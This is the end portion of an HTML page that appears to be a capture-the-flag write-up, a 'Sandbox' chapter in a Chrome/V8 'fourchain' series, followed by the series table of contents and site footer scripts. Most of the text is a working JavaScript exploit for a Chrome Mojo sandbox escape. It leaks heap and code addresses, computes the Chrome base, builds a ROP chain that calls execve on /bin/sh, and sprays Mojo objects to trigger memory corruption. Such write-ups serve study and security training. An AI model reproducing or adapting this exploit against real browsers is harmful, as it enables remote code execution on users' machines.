  <span class="nx">Mojo</span><span class="p">.</span><span class="nx">bindInterface</span><span class="p">(</span><span class="nx">blink</span><span class="p">.</span><span class="nx">mojom</span><span class="p">.</span><span class="nx">Sandbox</span><span class="p">.</span><span class="nx">name</span><span class="p">,</span> <span class="nx">mojo</span><span class="p">.</span><span class="nx">makeRequest</span><span class="p">(</span><span class="nx">iface</span><span class="p">).</span><span class="nx">handle</span><span class="p">);</span>

  <span class="k">return</span> <span class="nx">iface</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">async</span> <span class="kd">function</span> <span class="nx">sbx</span><span class="p">()</span> <span class="p">{</span>
  <span class="kd">let</span> <span class="nx">fake</span> <span class="o">=</span> <span class="nx">newClient</span><span class="p">();</span>
  <span class="kd">const</span> <span class="nx">heap_leak</span> <span class="o">=</span> <span class="p">(</span><span class="k">await</span> <span class="nx">fake</span><span class="p">.</span><span class="nx">getHeapAddress</span><span class="p">()).</span><span class="nx">addr</span><span class="p">;</span>
  <span class="kd">const</span> <span class="nx">text_leak</span> <span class="o">=</span> <span class="p">(</span><span class="k">await</span> <span class="nx">fake</span><span class="p">.</span><span class="nx">getTextAddress</span><span class="p">()).</span><span class="nx">addr</span><span class="p">;</span>

  <span class="kd">const</span> <span class="nx">chrome_base</span> <span class="o">=</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">text_leak</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x627fc20</span><span class="nx">n</span><span class="p">;</span>
  <span class="nx">print</span><span class="p">(</span><span class="s2">`Text leak: </span><span class="p">${</span><span class="nx">hex</span><span class="p">(</span><span class="nx">text_leak</span><span class="p">)}</span><span class="s2">`</span><span class="p">);</span>
  <span class="nx">print</span><span class="p">(</span><span class="s2">`Chrome base: </span><span class="p">${</span><span class="nx">hex</span><span class="p">(</span><span class="nx">chrome_base</span><span class="p">)}</span><span class="s2">`</span><span class="p">);</span>

  <span class="kd">const</span> <span class="nx">syscall</span> <span class="o">=</span> <span class="nx">chrome_base</span> <span class="o">+</span> <span class="mh">0x0972e4b7</span><span class="nx">n</span><span class="p">;</span> <span class="c1">// syscall; ret;</span>
  <span class="kd">const</span> <span class="nx">move_stack</span> <span class="o">=</span> <span class="nx">chrome_base</span> <span class="o">+</span> <span class="mh">0x08ff9a59</span><span class="nx">n</span><span class="p">;</span> <span class="c1">// add rsp, 0x28; ret;</span>
  <span class="kd">const</span> <span class="nx">pop_rdi</span> <span class="o">=</span> <span class="nx">chrome_base</span> <span class="o">+</span> <span class="mh">0x0d8e655b</span><span class="nx">n</span><span class="p">;</span> <span class="c1">// pop rdi; ret</span>
  <span class="kd">const</span> <span class="nx">pop_rsi</span> <span class="o">=</span> <span class="nx">chrome_base</span> <span class="o">+</span> <span class="mh">0x0d8cdf7c</span><span class="nx">n</span><span class="p">;</span> <span class="c1">// pop rsi; ret;</span>
  <span class="kd">const</span> <span class="nx">pop_rdx</span> <span class="o">=</span> <span class="nx">chrome_base</span> <span class="o">+</span> <span class="mh">0x0d86e112</span><span class="nx">n</span><span class="p">;</span> <span class="c1">// pop rdx; ret;</span>
  <span class="kd">const</span> <span class="nx">pop_rax</span> <span class="o">=</span> <span class="nx">chrome_base</span> <span class="o">+</span> <span class="mh">0x0d8e64f4</span><span class="nx">n</span><span class="p">;</span> <span class="c1">// pop rax; ret;</span>

  <span class="kd">let</span> <span class="nx">boxed_mem</span> <span class="o">=</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">heap_leak</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x18</span><span class="nx">n</span><span class="p">;</span>
  <span class="kd">let</span> <span class="nx">fake_object</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="mh">0x800</span> <span class="o">/</span> <span class="mi">8</span><span class="p">);</span>

  <span class="kd">let</span> <span class="nx">prog_addr</span> <span class="o">=</span> <span class="nx">boxed_mem</span> <span class="o">-</span> <span class="mi">7</span><span class="nx">n</span> <span class="o">+</span> <span class="mi">15</span><span class="nx">n</span> <span class="o">*</span> <span class="mi">8</span><span class="nx">n</span><span class="p">;</span>

  <span class="nx">fake_object</span><span class="p">.</span><span class="nx">fill</span><span class="p">(</span><span class="mh">0x4141414141414141</span><span class="nx">n</span><span class="p">);</span>
  <span class="nx">fake_object</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x68732f6e69622f</span><span class="nx">n</span><span class="p">;</span> <span class="c1">// /bin/sh</span>
  <span class="nx">fake_object</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">prog_addr</span><span class="p">;</span>
  <span class="nx">fake_object</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="nx">n</span><span class="p">;</span>
  <span class="nx">fake_object</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="nx">chrome_base</span> <span class="o">+</span> <span class="mh">0x0590cc13</span><span class="nx">n</span><span class="p">;</span> <span class="c1">// mov rsp, [rdi]; mov rbp, [rdi+8]; mov dword ptr [rdi+0x20], 0; jmp qword ptr [rdi+0x10];</span>

  <span class="nx">fake_object</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="nx">pop_rdi</span><span class="p">;</span>
  <span class="nx">fake_object</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="nx">prog_addr</span><span class="p">;</span>
  <span class="nx">fake_object</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="nx">pop_rsi</span><span class="p">;</span>
  <span class="nx">fake_object</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">=</span> <span class="nx">boxed_mem</span> <span class="o">+</span> <span class="mi">8</span><span class="nx">n</span> <span class="o">-</span> <span class="mi">7</span><span class="nx">n</span><span class="p">;</span>
  <span class="nx">fake_object</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="nx">pop_rdx</span><span class="p">;</span>
  <span class="nx">fake_object</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="nx">n</span><span class="p">;</span>
  <span class="nx">fake_object</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">=</span> <span class="nx">pop_rax</span><span class="p">;</span>
  <span class="nx">fake_object</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">=</span> <span class="mi">59</span><span class="nx">n</span><span class="p">;</span>
  <span class="nx">fake_object</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">=</span> <span class="nx">syscall</span><span class="p">;</span>

  <span class="nx">fake_object</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x68632f656d6f682f</span><span class="nx">n</span><span class="p">;</span> <span class="c1">// /home/ch</span>
  <span class="nx">fake_object</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x616c662f656d6f72</span><span class="nx">n</span><span class="p">;</span> <span class="c1">// rome/fla</span>
  <span class="nx">fake_object</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x65746e6972705f67</span><span class="nx">n</span><span class="p">;</span> <span class="c1">// g_printe</span>
  <span class="nx">fake_object</span><span class="p">[</span><span class="mi">18</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x72</span><span class="nx">n</span><span class="p">;</span> <span class="c1">// r</span>

  <span class="nx">fake</span><span class="p">.</span><span class="nx">pourSand</span><span class="p">(</span><span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">fake_object</span><span class="p">.</span><span class="nx">buffer</span><span class="p">));</span>
  <span class="nx">print</span><span class="p">(</span><span class="s2">`Fake object at: </span><span class="p">${</span><span class="nx">hex</span><span class="p">(</span><span class="nx">boxed_mem</span><span class="p">)}</span><span class="s2">`</span><span class="p">);</span>

  <span class="k">await</span> <span class="nx">uploadLogs</span><span class="p">();</span>

  <span class="kd">let</span> <span class="nx">clients</span> <span class="o">=</span> <span class="p">[];</span>
  <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">clients</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">newClient</span><span class="p">());</span>
  <span class="p">}</span>

  <span class="kd">let</span> <span class="nx">spray</span> <span class="o">=</span> <span class="p">[];</span>
  <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">100</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">spray</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">newClient</span><span class="p">());</span>
  <span class="p">}</span>

  <span class="kd">let</span> <span class="nx">iface</span> <span class="o">=</span> <span class="nx">newClient</span><span class="p">();</span>

  <span class="kd">let</span> <span class="nx">arg2</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="mh">0x1020</span> <span class="o">/</span> <span class="mi">8</span><span class="p">);</span>
  <span class="nx">arg2</span><span class="p">[</span><span class="mh">0x800</span> <span class="o">/</span> <span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">boxed_mem</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="nx">n</span><span class="p">;</span>
  <span class="nx">arg2</span><span class="p">[</span><span class="mh">0x800</span> <span class="o">/</span> <span class="mi">8</span> <span class="o">+</span> <span class="mh">0x818</span> <span class="o">/</span> <span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="nx">n</span><span class="p">;</span>
  <span class="nx">arg2</span><span class="p">[</span><span class="mi">2</span> <span class="o">+</span> <span class="mh">0x800</span> <span class="o">/</span> <span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="nx">move_stack</span><span class="p">;</span>

  <span class="kd">let</span> <span class="nx">arg</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">arg2</span><span class="p">.</span><span class="nx">buffer</span><span class="p">);</span>

  <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">clients</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">clients</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">pourSand</span><span class="p">(</span><span class="nx">arg</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">100</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">iface</span><span class="p">.</span><span class="nx">pourSand</span><span class="p">(</span><span class="nx">arg</span><span class="p">);</span>
    <span class="nx">iface</span><span class="p">.</span><span class="nx">ptr</span><span class="p">.</span><span class="nx">reset</span><span class="p">();</span>
    <span class="nx">iface</span> <span class="o">=</span> <span class="nx">newClient</span><span class="p">();</span>
  <span class="p">}</span>

  <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">spray</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">spray</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">pourSand</span><span class="p">(</span><span class="nx">arg</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="nx">print</span><span class="p">(</span><span class="dl">'</span><span class="s1">done</span><span class="dl">'</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">async</span> <span class="kd">function</span> <span class="nx">pwn</span><span class="p">()</span> <span class="p">{</span>
  <span class="nx">print</span><span class="p">(</span><span class="dl">'</span><span class="s1">hello world</span><span class="dl">'</span><span class="p">);</span>

  <span class="k">try</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="nx">Mojo</span><span class="p">)</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">undefined</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">throw</span> <span class="dl">'</span><span class="s1">no mojo sadge</span><span class="dl">'</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="nx">print</span><span class="p">(</span><span class="s2">`Got Mojo!: </span><span class="p">${</span><span class="nx">Mojo</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
      <span class="k">await</span> <span class="nx">sbx</span><span class="p">();</span>
    <span class="p">}</span>
  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">print</span><span class="p">(</span><span class="s2">`[-] Exception caught: </span><span class="p">${</span><span class="nx">e</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
    <span class="nx">print</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">stack</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="k">await</span> <span class="nx">uploadLogs</span><span class="p">();</span>
<span class="p">}</span>

<span class="nx">pwn</span><span class="p">();</span>

<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<h2 id="table-of-contents">Table of Contents</h2>

<ul>
  <li><a href="./fourchain-prologue">Prologue</a>: Introduction</li>
  <li><a href="./fourchain-hole">Chapter 1: Hole</a>: Using the “hole” to pwn the V8 heap and some delicious Swiss cheese.</li>
  <li><strong><a href="./fourchain-sandbox">Chapter 2: Sandbox</a> (You are here)</strong></li>
  <li><a href="./fourchain-kernel">Chapter 3: Kernel</a>: Chaining the Cross-Cache Cred Change</li>
  <li><a href="./fourchain-hv">Chapter 4: Hypervisor</a>: Lord of the MMIO: A Journey to IEM</li>
  <li><a href="./fourchain-fullchain">Chapter 5: One for All</a>: Uncheesing a Challenge and GUI Troubles</li>
  <li><a href="./fourchain-epilogue">Epilogue</a>: Closing thoughts</li>
</ul>




<!--       <footer class="site-footer">
        <a href="https://twitter.com/0rganizers">Twitter</a> | <a id="changeTheme" class="btn-toggle">Dark-Mode</a>
      </footer> -->

      <div class="lever-meme">
        <div id="lever" class="lever-off"></div>
      </div>

      <div class="twitter">
        <a href="https://twitter.com/0rganizers"><img src="/assets/images/twitter.svg"></a>
      </div>

      <script>
        let leverCount = 0;
        let manic = false;

        function resetLever() {
            leverCount = 0;
            setTimeout(resetLever, 1750);
        }

        resetLever();

        document.getElementById('lever')
        .addEventListener('click', function (event) {
          if(leverCount > 10){
            manic = true;
            document.getElementById("lever").classList.add('lever-manic');
            document.getElementById("header-logo").classList.add('rainbow');
          }

          if(!manic){
            document.getElementById("lever").classList.toggle('lever-on');
            ++leverCount;
          }
        });


      </script>

      <script>
      function updateThemeToggleFooter() {
        let elem = document.querySelector('#lever');
        // elem.innerHTML = isLightThemeSelected() ? 'Dark Mode' : 'Light Mode'
      }

      (function() {
        updateThemeToggleFooter()
      })();

      function togglePageContentLightDark() {
          var html = document.getElementsByTagName('html')[0]
          var currentClass = html.className
          var newClass = html.className == 'dark-theme' ? 'light-theme' : 'dark-theme'
          html.className = newClass

          document.cookie = 'theme=' + (newClass == 'light-theme' ? 'light' : 'dark') + '; SameSite=Strict; path=/; expires=Fri, 31 Dec 9999 23:59:59 GMT'
          console.log('Cookies are now: ' + document.cookie)

          updateThemeToggleFooter()
      }

      const btn = document.querySelector("#lever");
      btn.addEventListener("click", function() {
        togglePageContentLightDark();
      });
      </script>
    </main>
  </body>
</html>
